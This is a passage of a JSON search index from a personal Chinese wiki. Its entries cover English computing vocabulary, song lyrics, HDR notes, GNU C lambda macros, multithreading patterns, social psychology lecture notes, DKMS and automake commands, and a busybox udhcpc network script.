发售了! 唉 粘土人哟~ 得赶快了~ 但是 有人气的只是作为粘土人的黑白小姐 而不是作为偶像的黑白小姐 啊 真是复杂呢..","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"计算机术语","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/英语/计算机术语/","text":"缩写CTOR creatorPAR parametersIDX indexOE Output EnableSEG segmentationHUP hang upFT feature IrDA Infrared Data Association（红外数据组织） UPP Universal Parallel Port（通用并行端口） GPMC General-Purpose Memory Controller（通用储存控制器）其他polled mode 轮询模式iterate 迭代argument 自变量spinlock 自旋锁brown-out 电压过低（brown-out detection 掉电检测）architecture 架构instruction 指令super 似乎是java和python之类的语言里 用来父类方法的关键字scatter 散布latency 延迟use-case-view 用例视图instance 实例 nibble半字节 有的指令支持操作半字节数据词语原意为“一点点地咬”（high/low nibble 高低半字节 ） routine原意: 常规计算机领域: 例行程序, 指会被反复调用的程序, 须精简高效, 如win中dll封装的那些I/O交互程序. top-half/bottom-halflinux中的中断上半部和下半部(中断服务程序ISR), 下半部(一些处理函数)延迟执行. key-value pairs键值对","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"英语","slug":"自然语言/英语","permalink":"http://wiki.noodlefighter.com/categories/自然语言/英语/"}]},{"title":"HDR研究","date":"2019-06-09T00:00:00.000Z","path":"wiki/艺术/摄影/hdr研究/","text":"以下是自己的聊天记录： 今天深入学习了一下相机sensor，终于搞清楚了之前一直炒的HDR视频概念 大宽容度，还是得靠摄像设备sensor本身的性能，后面那些视频格式、显示设备，都是忽悠人的，为了HDR而HDR 所谓HDR，从终端用户眼里，就是和人眼视觉相似的效果嘛 要得到这样的效果，我们需要啥 录像、存储、回放，哪一步是最重要的？ 首先，对于录像设备，怎么样才能拿到做HDR的数据，不靠后期用多次成像的数据合成 那就是提高sensor每个像素的分辨率（就是AD采样位数嘛） 然后通过RAW数据，做曲线调整，着色、渲染出逼近人眼的效果 至于存储，能提高的是色彩深度，那现行的格式，能满足我们人眼的需要了吗，人眼能识别全这些颜色了吗 从直觉上，现在的YUV色域，已经是大大超过人眼的视觉范围了。。储存上的提升应该是微小的 再到回放，显示器上像素的“宽容度”，也就是——一个像素点能多黑、能多亮其实到了OLED时代——能多黑，已经是能完全黑了。。能多亮，得看你眼睛能受得了多亮。。这些都不太成问题 我觉得可以提升的点在于亮度区间里，分辨率的准确度， 特别是暗色区间 但是这。。能提升多少？ 对于人眼而言，现在一张我们人工合成的HDR照片，放到屏幕上，我们能有很明显的提升体验吧？那我们再对屏幕加强，能提升多少。。？直觉上也是很微小的提升 所以结论是，HDR的关键在于录像设备。。。 但是厂商们为了盈利，都在炒新格式、新标准，这个应该是标准和商业竞争的问题，与技术无关 不一定对，欢迎交流讨论，这是短时间初步学习得到的结论","tags":[],"categories":[{"name":"艺术","slug":"艺术","permalink":"http://wiki.noodlefighter.com/categories/艺术/"},{"name":"摄影","slug":"艺术/摄影","permalink":"http://wiki.noodlefighter.com/categories/艺术/摄影/"}]},{"title":"A-Day-in-the-S.I.O.U","date":"2019-06-09T00:00:00.000Z","path":"wiki/艺术/音乐/歌词/a-day-in-the-s-i-o-u/","text":"自己听写出来的。。 沙野カモメ - A Day in the S.I.O.U..lrc 123456789101112131415161718192021222324252627282930[ti:A Day in the S.I.O.U.][ar:沙野カモメ][al:UNGLAND 6][00:00.00][00:22.16][00:32.89][00:45.99][01:31.81][01:54.89][02:16.86][02:38.51][03:00.70][03:22.27][04:27.83][04:49.42][05:05.77] [00:11.52]楽しそうな私を見る時は[00:14.60]これぐらい、い？[00:17.51]手、そんな[00:20.77]もう一本埋めるんですか[00:22.37]君は笑わないんだね [00:26.00]ありがとう[00:27.72]うんん、何でもない[00:31.00]っああ、すみません、間違えました[00:34.61]とろけまして…[00:37.72]戦い…[00:38.72]いいｘｘ一杯ｘｘじゃない？[00:42.18]ウフフ ウフフ ウフフフ[01:30.98][05:05.37]ふぁっ[01:53.54]ほら、頑張って！[02:15.43]さあ、しっかり！[02:37.56]頑張れ[03:44.91]あなたと知り合って[03:46.49]仲良くなって[03:48.43]驚いたり 考えたり[03:50.86]教えられたりしたことが[03:52.61]私の中で大きくなって[03:54.83]嬉しかったり 切なかったり[03:58.38]生まれて初めての気持ちで[04:01.48]私 あなたのことが…[04:05.79]","tags":[],"categories":[{"name":"艺术","slug":"艺术","permalink":"http://wiki.noodlefighter.com/categories/艺术/"},{"name":"音乐","slug":"艺术/音乐","permalink":"http://wiki.noodlefighter.com/categories/艺术/音乐/"},{"name":"歌词","slug":"艺术/音乐/歌词","permalink":"http://wiki.noodlefighter.com/categories/艺术/音乐/歌词/"}]},{"title":"日常","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/英语/日常/","text":"angle brackets 尖括号dynamical 动态的opaque 不透明的dummy 假的be capable of 能够polarity 极性probe 侦测specified 指定的coarse/fine 粗糙的/细致的fractional 分数divisor 除数deferred 延迟的deprecate 不赞成使用（函数过期时algorithm 算法cheat sheet 小抄arbitrary 任意的potentially 可能地、潜在地leads to 导致phases 阶段semantics 语义","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"英语","slug":"自然语言/英语","permalink":"http://wiki.noodlefighter.com/categories/自然语言/英语/"}]},{"title":"口琴谱","date":"2019-06-09T00:00:00.000Z","path":"wiki/艺术/音乐/谱子/口琴谱/","text":"星之所在星の在り処（ほしのありか） 商業都市ボース 陽だまりにて和む猫","tags":[],"categories":[{"name":"艺术","slug":"艺术","permalink":"http://wiki.noodlefighter.com/categories/艺术/"},{"name":"音乐","slug":"艺术/音乐","permalink":"http://wiki.noodlefighter.com/categories/艺术/音乐/"},{"name":"谱子","slug":"艺术/音乐/谱子","permalink":"http://wiki.noodlefighter.com/categories/艺术/音乐/谱子/"}]},{"title":"gnu-c匿名函数宏","date":"2019-06-09T00:00:00.000Z","path":"wiki/计算机/编程/C/gnu-c匿名函数宏/","text":"参考： https://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html https://gcc.gnu.org/onlinedocs/gcc/Nested-Functions.html C语言实现匿名函数 via: https://www.cnblogs.com/eben-yl/p/4662567.html 在C语言中可以通过宏定义的方式实现匿名函数,具体如下: 1`#define lambda(return_type, function_body) \\``({ \\`` ``return_type $``this` `function_body \\`` ``$``this``; \\``})``#define $ lambda` 该定义利用了GCC对C语言的扩展(被一对花括号包起来的代码块能够返回一个值),该宏定义能够返回$this(函数指针),如果我们需要一个返回两整数的和的函数,那么我们还可以对该宏再做一次封装,如下: 1`#define add2int(function_body) $(int, (int _a, int _b){function_body})` 然后我们就可以像下面这样来使用该宏(求一个整型数组所有元素的和): 1`int` `sum(``int` `*arr, ``int` `length, ``int` `(*add)(``int``, ``int``));``int` `main(``int` `argc, ``char` `**argv)``{`` ``int` `arr[] = { [0 ... 9] = 1, [10 ... 89] = 2, [90 ... 99] = 3 };`` ``int` `ret = sum(arr, ``sizeof``(arr)/``sizeof``(``int``), add2int(``int` `c = _a + _b; ``return` `c;));`` ``//add2int返回一个求两个整数和的函数` ` ``printf``(``\"sum of arr is %d\\n\"``, ret);``}``int` `sum(``int` `*arr, ``int` `length, ``int` `(*add)(``int``, ``int``))``{`` ``int` `sum = 0;`` ``for` `(``int` `i=0; i < length; i++)`` ``{`` ``sum = add(sum, arr[i]);`` ``}`` ``return` `sum;``}` 当然也可以直接使用lambda宏,注意function_body需要包含函数的返回类型及参数列表,将上面第6行代码替换为: 1`int` `ret = sum(arr, ``sizeof``(arr)/``sizeof``(``int``), $(``int``, (``int` `_a, ``int` `_b){`` ``int` `c = _a + _b;`` ``return` `c;``});` 使用GCC语句表达式的匿名函数","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"多线程编程","date":"2019-06-09T00:00:00.000Z","path":"wiki/计算机/编程/多线程编程/","text":"TODO http://blog.chinaunix.net/uid-26729065-id-3082025.html http://www.cnblogs.com/CareySon/archive/2012/04/14/Process-SynAndmutex.html 多线程编程设计模式 via: http://www.resetoter.cn/?p=155 1、Immutable Object模式（不可变对象） 通过将对象变为只读的形式来保证线程安全，是比较好的无锁实现。 无非就是将所有可以变的变量的setter全部对访问者关闭，并且防止有可修改引用泄露出去。 2、Guarded Suspension模式（保护性暂挂） 有时候一些线程在执行的时候需要满足一些条件，倘若没有满足的话便无法执行下去，这个时候我们通过暂挂（跑一跑空循环之类的）来让线程暂时挂起，等待条件满足的时候再继续执行。 在后面的Promise模式中，比如在多线程中写得很多的Future就经常会用到，结果还没算出来，那就不好意思，请等一会儿再执行咯。 3、Two-phase Termination模式（两阶段终止） 在终止线程的时候我们或许会丢掉很多东西，比如一些状态，或者还有一些必要执行的东西还未执行完。倘若直接中断线程的话会引起很多问题，所以在终止线程之前我们或许需要等待这些操作。 例如在Java的标准库中，线程池就会等待目前仍在执行的线程，执行完全之后就会完全关闭线程池。后面的Thread Pool模式中也会用到。 4、Promise模式（承诺） Promise模式帮我们不需要等待耗时的求值操作，而是拿一个凭证。我们可以先去做些别的，最后再回来取值。在Java中的Future就是用的这个思想。 5、Producer-Consumer模式（生产者-消费者） 在多线程编程中经常有一个生成数据以及一个消费数据的两个模块，这两者的速率通常是不相等的，所以为了避免等待，该模式中引入了通道的概念。 生产者将产生的数据放入一个队列，消费者则从队列中拿数据。并且生产者与消费者是完全解耦的。 改进版本中也有用多个通道进行消费，减少锁竞争，再者也可以用工作窃取的方式进行负载均衡。 6、Active Object模式（主动对象） 该模式将方法的调用与执行解耦。使用者通过同步的方式调用，而后台以异步的方式执行。调用与执行分开在不同线程以提高并发性，当然也可以用到Promise模式来得到结果。 7、Thread Pool模式（线程池） 这个模式就是为减少开启与关闭线程带来的开销。但是在使用的时候还是有很多需要注意的地方，例如死锁、线程泄漏之类的问题，导致可用线程越来越少。 Java中直接用各种Executer，已经是很好的线程池了，也没有必要自己再实现一个。 8、Thread Specific Storage模式（线程特有存储） 通过每个线程独立储存数据来避免竞争。也是一种很好的无锁线程安全实现方式，但是要注意内存泄漏，当线程销毁之后，保证数据也能够被及时销毁。 在Java当中直接使用ThreadLocal来应用该模式。 9、Serial Thread Confinement模式（串行线程封闭模式） 并发任务涉及到非线程安全对象时我们有时候又不希望使用锁，那我们就可以使用该模式。 由于每次只有一个线程去访问该非安全对象，所以无需担心线程不安全。 其本质是将锁替代为开销更小的锁。（其实可以看做行为队列） 10、Master-Slave模式（主仆） 将任务拆解为更小的任务，小任务或许还能拆解成更小的任务，然后这些任务交给不同的工作线程进行执行。 最后将这些任务进行合并，以达成完成所有任务的目的。在工作线程中我们需要通过负载均衡以及工作窃取来达成最高效率。 当然该模式也可以用来做可靠性设计，子任务中只取一个正确完成的结果，只需要确保所有子任务中有一个任务完成就可以了。 在停止任务的时候我们也需要用到两阶段停止的思想，将子任务执行完之后自动停止。 11、Pipeline模式（流水线） 在执行任务的时候，我们通常可以将任务分解成不同的阶段，在一些阶段当中或许只有一个线程参与，而在另一些阶段中则有多个线程进行参与。 我们可以通过配置文件的方式来配置我们的自定义流水线。 需要注意的是，流水线由于独立出很多资源，所以一定会有额外的开销，所以要注意管线的深度，保证不要得不偿失。 在始终只有一个线程参与的情况下，也可以将Pipeline看做是Serial Thread Confinement模式。 12、Half-sync/Half-async模式（半同步/半异步） 在多线程编程当中我们会发现，同步模式易于理解，而异步模式对IO更加高效。 所以引入这一模式，将模块分成三层，同步层、中间层、异步层，同步层进行一些同步编写，而异步层则进行IO操作，操作完成后将数据放入中间层，而同步层从中间层取得数据。 需要注意同步层的高级任务，例如数据库、网络任务执行过慢的时候考虑使用非阻塞IO。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"ne2000","date":"2019-06-09T00:00:00.000Z","path":"wiki/计算机/计算机网络/ne2000/","text":"https://en.wikipedia.org/wiki/NE2000#History NE2000是一个由Novell公司所创立并且高度成功的ISA网络卡的标准。他的流行使电脑网络变得无处不在。这系列的网卡的原型，是美国国家半导体（National Semiconductor）设计的，使用他们自己的8390网络芯片的网卡。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"计算机网络","slug":"计算机/计算机网络","permalink":"http://wiki.noodlefighter.com/categories/计算机/计算机网络/"}]},{"title":"伟大wall","date":"2019-06-09T00:00:00.000Z","path":"wiki/计算机/计算机网络/伟大wall/","text":"纯净DNS加密dns实现 https://dnscrypt.info/implementations/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"计算机网络","slug":"计算机/计算机网络","permalink":"http://wiki.noodlefighter.com/categories/计算机/计算机网络/"}]},{"title":"网络常识","date":"2019-06-09T00:00:00.000Z","path":"wiki/计算机/计算机网络/网络常识/","text":"两台陌生的主机是如何保证数据正确交付的https://mp.weixin.qq.com/s/3zBIkRq0iwd2B5AcJE1E1g 单帧确认 退回N步（GBN） 选择重传（SR）","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"计算机网络","slug":"计算机/计算机网络","permalink":"http://wiki.noodlefighter.com/categories/计算机/计算机网络/"}]},{"title":"社会心理学学习笔记","date":"2019-06-08T00:00:00.000Z","path":"wiki/心理学/社会心理学学习笔记/","text":"加利福尼亚大学洛杉矶分校公开课，社会心理学学习笔记。 （working…） 课程介绍假设1. 情景对人的影响很大人的想法、行为，受所处情景影响。情景不可视，每个人的情景不同。 假设2. 我们总是不知道，人做某事的原因归因错误，而我们也不知道自己为什么要做某事。 假设3. 我们从本质上不知道我们不知道我们使用偏见，无意识地快速抉择，难以察觉。 甚至对自己的看法，也是在数秒内，临时构建出的。 假设4. 令人惊讶的是，我们精确地知道人们做事情的原因和他们是哪种人人的两个社会基本需求：人们想要被别人喜欢、有归属的需要；人们想要准确、一致、可信，想要在别人和自己的眼里始终如一。 情境评价和朴素实在论三个术语 情景：暗示或假定的物理环境、社会环境，也就是你觉得将要发生的事 情景的力量囚徒困境题目，被称作“社区游戏”和“华尔街游戏”时，前者明显更使人倾向选择“合作”，而后者更使人倾向“叛变”。 里根总统的辩论中，风趣的辩论使现场充满笑声。技术手段除去现场观众的声音，把它和原视频播放给两波人，发现现场观众的声音会影响观看录像的人对里根的评价。 我们无法预测自己的行为每个人都认为自己是理性的，会把自己的行为作为准则——就像开在高速路上的汽车，比自己慢的都是傻子，比自己快的都是疯子，但自己的速度并不可能恒定；同理，我们认为别人会不会做某事，都会以自己为标准（相信自己会不会做某事）。 滑坡效应电击实验：实验者被要求，学生每犯一次错时增加15V电击，从15V-450V，播放不同程度惨叫的录音，300V后不会发出声音（装昏厥）。 旁观者都觉得大多数人会在300v时要求停止，但实际上68%都做到了最后。 原因是：因为每次只增加15V，我们不会认为之前自己做的事是错的（人趋势于对自己认识始终如一），如果255V时认为自己做错了，那就意味着240V时也做错了——我们的底线是浮动的。 朴素实在论不信任主观解释，主观解释能产生多种合理的观点；不相信我和你能产生同一种看法。 偏见——敌对媒体效应(视频下一节讲)中立的新闻文章，在两群敌对人群中的眼里有不同的解读，双方都认为文章反对自己的立场：双方都认为自己是中立的，自己当作标准，这就是偏见。 自动性和启动法我们之所以意识不到主观，是因为它们是自动形成的。 优先启动刺激呈现法（Tory Higgins）设计2个实验，从被实验者视角看起来毫不相干： 把被实验者分为两组，让他们记忆一些词汇，词汇中穿插了一些用来评价一个人的词汇：给一组展示了是褒义词“自信、勇敢”等，另一组则是贬义词“自负、鲁莽”等 阅读一段描述一个人的文段，里面提到他“觉得自己努力做什么都能成功”（自信/自负）、“穿越大西洋”（勇敢/鲁莽）等，要求被实验者评价他 结果是，记忆褒义词的那组，给出了大量正面评价；而记忆了贬义词的那组，大多为负面评价。 另外，如果穿插了“感恩”、“无礼”之类与文段毫无相关的词，就不会影响对他的评价。 我们产生了偏见，且不自觉。 阈下启动——警觉实验（Bargh）把上一个实验简单修改，测试充满“敌意”的启动词对评价的影响。 结果发现“敌意”相关的启动词能影响“敌意”的评价，而无关的词则不会影响。适用于评价特定的性格特征。 自动认知负荷一个实验，要求被试者记（或不记）一串数字，期间给他念关于神父Bob的30个句子： 10句关于善意的（合理） 10句关于非善意的（不合理） 10句无关句子 （我们都知道人们容易记忆不合理的事情） 结果如图： 结论：这种记忆不合理的事情需要认知努力（cognitive effort），承受认知负荷时，“人们容易记忆不合理的事情”这一现象就无法产生，该现象不具备“自动性”。 自动性定义： 无意图 无需注意 不妨碍其他思考过程 无需努力 比如一个红色正方形放你眼前，他不会影响到你记忆其他东西。 知觉直接性如果我们经历过的事情是自动性的，它就会立即成为我们经验的一部分。 关系网络联想： 男生英语差 罗蜜欧&朱丽叶 以上是我们能意识到的，有一种联想在意识（conscious awareness）以下，试想，我们脑内有一个女性名字的数据库，平时要列举女性名字时很难想起“朱丽叶”因为在这个时代并不常见，而提起“罗蜜欧”时这个名字就会自然地跃过这条意识的“线”： 习惯可及性 可及性理论(accessibility theory) : 通常指一个人在生成和理解语篇时,从大脑记忆 系统中提取一个语言或记忆单位的便捷程度。 一些时在日常中会不断地重复，这些事是习惯可及的，与我们的意识很接近，很容易联想起来，高效地利用它们。 （高速缓存？？） 这些习惯可及性表征，不断地塑造我们的主观性认识，这造成了人之间的差异。 比如酒会上，有人喊你的名字，你比其他人更容易注意到这个名字。（鸡尾酒效应） 比如美国和东亚国家，因为环境差异，人成长过程中获得的信息不同，前者会从外界不断地获得“成为一个独立的人”的意识，而后者倾向于“相互依存，整体融洽”。 启动和习惯可及性同时作用 先找出习惯可及为“不顾他人的”人，和“键谈的”人。 让他们参加启动任务“句子删词”，如：Dog the mail letter (Mail the letter)。 共20句子，一半的研究对象会被启动： She inconsiderate is was She talkative is was 让他们读句子：他总是在走廊打电话。 发现启动词在短时间内的效果胜过习惯可及构念。 自启动行为一项实验证明了，自动不仅影响人们对他人的评价，还会影响人们的行为。 启动词任务：礼貌启动词、普通词、粗鲁启动词 让受试者到另一间房间找研究者，研究者在那跟别人说话 记录有多少人在10分钟内打断了对话 结果是，受礼貌启动词启动的人，只有少部分人在10分钟内打断了对话；而受粗鲁启动词启动的人，打断对话的人要多得多。 启动实验受试者做常识测试，分三组： 一组，测试前什么都不做（对照组） 二组，被要求想象教授一天的生活 三组，被要求想象超级模特一天的生活 结果是二组成绩好，三组成绩差。 自动目标实验1 读关于一个人的表现的文章。 受试者分两组： 一组被要求记忆，后面会测试 另一组被要求在之后描述对这个人的印象 后者表现得更好。 实验2 实验一的基础上，使用组句的方式进行“启动”： 一组，被启动“记忆” 另一足，被启动“印象” 实验结果同实验1. 实验2证明了无论是否有意识地接受目标，并不重要。 P.S.这里有个被称为“神秘情绪”的东西，如果未能完成目标，事先接受了目标（无论是否有意识地）的受试者，比起未事先接受目标的受试者，心情会更差。 一些关于自动性的讨论自动性从何而来 无意识地：如文化感染、婴儿学语言 有意识地练习：打字、运动、乐器、学习习惯 它意味着什么他很重要，能无意识地进行自动关联，影响我们的主观见解，而不需要我们同意。 我们看一些人似乎是在有目标地做一些事，但实际上可能并不是这样，可能是一些自动行为。 意识知觉（Conscious Awareness）和控制性加工（Controlled Processing）概念解释下列两个问题有什么区别： Are hamster conscious? Can hampsters think? 一般来说，第一句中的conscious指的是表现出有意识的行为；第二句中的think指的是思考过程。 这对应了两种类型的意识： 直接经验（immediate experience），前反思意识（pre-reflective consciousness）指的是无法反思的意识（大概指的是第一个问题中的conscious），： 意识流（Stream of consciousness），一直存在的意识（William James, 1890） 知觉（Perception driven by automatic construals） 现实？（大概在说人类通过感官，所感受到的世界） 与无意识过程（nonconscious processes）有关？（就是之前提到的“自动性”吧，比如当看到一个东西是红色的，我们没法控制自己不认为那是红色） 反思意识（reflective consciousness）（大概就是指第二个问题中的think）： 思考（Thought） 对于“意识流”做出的反应：比如听课的过程，只是单方向地接受信息，直到注意到了奇怪的地方，才开始去思考 相关性（aboutness），指的是我们思考的时候，总是会针对某事物进行思考（about something），而意识流不是针对某事，他本身就是件事情） 控制过程（controlled processes）或控制性加工（controlled Processing）：思考的过程就像由我们个人控制的过程，相对与“无意识过程” 两者的关系，直接经验就像电影，而反思意识就像影评人。 阅读、打字等行为，是两者意识的结合。 控制过程（Controlled Processes） 与自动过程相对，以下为它的特性： 有意地（intentional） 与意识相关 会干扰到其他的处理过程 需要付出努力 趋向语言相关（linguistic） 体验上，是种脑力劳动，并不是像“现实”一样，本来就在那里 是种特殊而有限的资源，因为人一次只能处理一个控制过程 比如说到“摩托车毯子”，我们不知道是什么，但能想象。 控制过程不一定准确，但我们趋于认为他是准确的，因为它能通过成系统的语言去表达出来，使我们自己信服。例子“电梯逻辑”：一栋楼有6层，搭电梯从1楼上到2楼会被大多数人认为是不合常理的（因为楼梯可能就在旁边），但如果是第一次来这的人可能不知道楼梯的地方，或者脚患有病无法上楼，这就变得合理了。 错误共识效应（False Consensus Effect）问受试者：给你每小时25刀酬劳，你愿意背着“EAT AT BAJA FRESH”的横幅在校园里走吗？ 回答愿意的人，趋向于认为别人也愿意；回答不愿意的人，趋向于认为别人也不愿意。 其原因，之前而已探讨过，所处情景不同、以及偏见。 但我们很容易猜出某个人会不会做某件事，只是我们在回答这个问题时，选择错了参考的例子，把特例（比如自己）当成普适。 反省思维（Introspective Thinking）想的和实际的表现不一定相同。比如，被询问到最喜欢的电影是什么，即答xxx，但这有可能是错的，因为如果他再次去看那部电影，可能会得到不一样的结论。 实验Telling more than we can know (Nisbeet & Wilson, 1977)街边设展台，询问路人喜欢哪种品牌的清洁剂，分两组： 其一组，直接询问 另一组，先向他们展示“太阳和月亮”这样的词汇 后者趋向于回答“汰渍（Tide）”，而向他们询问给出这个答案的原因时，会说出一些“错误”理由，比如“因为我妈在用”、“因为有名”等等，而真实原因是之前说的“启动性”。 他们不仅被启动词影响，还编造出了原因。 实验Telling Good Art from Bad (Wilson et al, 1993)向被试者展示两张画：莫奈的画、加菲猫卡通图，要求依据自己喜欢的程度进行评分，分两组： 一组没做要求给出评分的理由 另一组被要求说出理由 让他们带喜欢的画回家，两周后做回访，问他们现在对手头上的画喜欢的程度，结果选择莫奈的大多称自己仍喜欢，而很多选择卡通的后悔了。 由于莫奈的画比较抽象难以用语言描述，而卡通容易说出理由，导致了人最自己的喜好做出了错误的选择。","tags":[],"categories":[{"name":"心理学","slug":"心理学","permalink":"http://wiki.noodlefighter.com/categories/心理学/"}]},{"title":"发霉","date":"2019-06-08T00:00:00.000Z","path":"wiki/日常/发霉/","text":"衣服被子生霉原因没洗晒就储存、堆放都会生霉。 有过冬天用的被子，堆在角落，外边没事，夹在中间部分生霉了，汗多的那一侧。 霉的不是很严重的话，可以用漂白剂处理。 霉得太厉害就得丢掉了，除非拆开弄掉生霉的部分。 衣物防霉南方的柜子也糟不住潮湿，换季就把不用的衣服洗晒后密封存放。 墙面生霉用漂白剂稀释喷雾能去除，但是第二年还会再长，所以还是得上新风做全屋防潮。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"}]},{"title":"DKMS","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/dkms/","text":"动态内核模块支持 来源: Wiki百科 via: https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E6%94%AF%E6%8C%81 动态内核模块支持(DKMS) 是用来生成Linux的内核模块的一个框架，其源代码一般不在Linux内核源代码树。 当新的内核安装时，DKMS支持的内核设备驱动程序 到时会自动重建。 DKMS可以用在两个方向：如果一个新的内核版本安装，自动编译所有的模块，或安装新的模块（驱动程序）在现有的系统版本上，而不需要任何的手动编译或预编译软件包需要。例如，这使得新的显卡可以使用在旧的Linux系统上。 DKMS是由戴尔的Linux工程团队在2003年写的。它已经被许多Linux发行版所包含，如Ubuntu 8.10和Fedora。它是以GNU通用公共许可证（GPL）v2或以后的条款发布下的免费软件。DKMS原生支持RPM和DEB软件包格式。 DKMS（Dynamic Kernel Module Support）动态内核模块支持。 旨在创建一个内核相关模块源可驻留的框架，以便在升级内核时可以很容易地重建模块。这将允许 Linux 供应商提供较低版本的驱动程序，而无需等待新内核版本发行，同时还可以省去尝试重新编译新内核模块的客户预期要完成的工作。Oikawa等人在1996年提出一种与LKM类似的动态核心模块（DKMs）技术。与LKM一样，DKMs以文件的形式存储并能在系统运行过程中动态地加载和卸载。DKMs由一个用户层的DKM服务器来管理，并非由内核来管理。当核心需要某模块时，由DKM服务器负责把相应的DKM加载；当核心的内存资源紧缺时，由DKM服务器负责卸载一个没有被使用的DKM。缺点是所有的DKM是存储在本地系统上的，占用了大量宝贵的存储空间。 实现github仓库: https://github.com/dell/dkms Archlinux对它的支持 via: https://wiki.archlinux.org/index.php/Dynamic_Kernel_Module_Support 列出内核模块列出当前模块的状态，版本，包括源码树内的模块： 1# dkms status 重新构建模块为当前内核重新构建所有的模块： 1# dkms autoinstall -k 或者重新构建某个特定的模块： 1# dkms autoinstall -k 3.16.4-1-ARCH","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"automake","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/automake/","text":"提示缺少build-aux123456789101112131415161718dev@develop:~/workspaces/libnl$ autoreconfconfigure.ac:51: error: required file 'build-aux/ar-lib' not foundconfigure.ac:51: 'automake --add-missing' can install 'ar-lib'configure.ac:51: error: required file 'build-aux/compile' not foundconfigure.ac:51: 'automake --add-missing' can install 'compile'configure.ac:73: error: required file 'build-aux/config.guess' not foundconfigure.ac:73: 'automake --add-missing' can install 'config.guess'configure.ac:73: error: required file 'build-aux/config.sub' not foundconfigure.ac:73: 'automake --add-missing' can install 'config.sub'configure.ac:49: error: required file 'build-aux/install-sh' not foundconfigure.ac:49: 'automake --add-missing' can install 'install-sh'configure.ac:73: error: required file 'build-aux/ltmain.sh' not foundconfigure.ac:49: error: required file 'build-aux/missing' not foundconfigure.ac:49: 'automake --add-missing' can install 'missing'lib/Makefile.am: error: required file 'build-aux/depcomp' not foundlib/Makefile.am: 'automake --add-missing' can install 'depcomp'parallel-tests: error: required file 'build-aux/test-driver' not foundparallel-tests: 'automake --add-missing' can install 'test-driver' 解决方法：12automake --add-missingautoreconf -i","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"busybox","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/linux/devtools/busybox/","text":"DHCP客户端udhcpcbusybox自带个简单的dhcp client，获取到IP后会执行脚本进行配置，编辑/usr/share/udhcpc/default.script，记得给+x权限： 123456789101112131415161718192021222324252627282930313233343536373839#!/bin/sh#script edited by Tim Riker [ -z \"$1\" ] && echo \"Error: should be called from udhcpc\" && exit 1RESOLV_CONF=\"/etc/resolv.conf\"[ -n \"$broadcast\" ] && BROADCAST=\"broadcast $broadcast\"[ -n \"$subnet\" ] && NETMASK=\"netmask $subnet\"case \"$1\" in deconfig) /sbin/ifconfig $interface 0.0.0.0 ;; renew|bound) /sbin/ifconfig $interface $ip $BROADCAST $NETMASK if [ -n \"$router\" ] ; then echo \"deleting routers\" while route del default gw 0.0.0.0 dev $interface ; do : done for i in $router ; do route add default gw $i dev $interface done fi echo -n > $RESOLV_CONF [ -n \"$domain\" ] && echo search $domain >> $RESOLV_CONF for i in $dns ; do echo adding dns $i echo nameserver $i >> $RESOLV_CONF done ;;esacexit 0 执行结果：1234567891011121314151617~ # udhcpcudhcpc (v1.20.2) startedSending discover...Sending select for 192.168.1.68...Lease of 192.168.1.68 obtained, lease time 86400deleting routersroute: SIOCDELRT: No such processadding dns 192.168.2.1adding dns 192.168.2.1~ # ifconfigeth0 Link encap:Ethernet HWaddr 00:E0:4C:36:04:71 inet addr:192.168.1.68 Bcast:192.168.3.255 Mask:255.255.252.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:70680 errors:0 dropped:51 overruns:0 frame:0 TX packets:10 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:4522321 (4.3 MiB) TX bytes:2728 (2.6 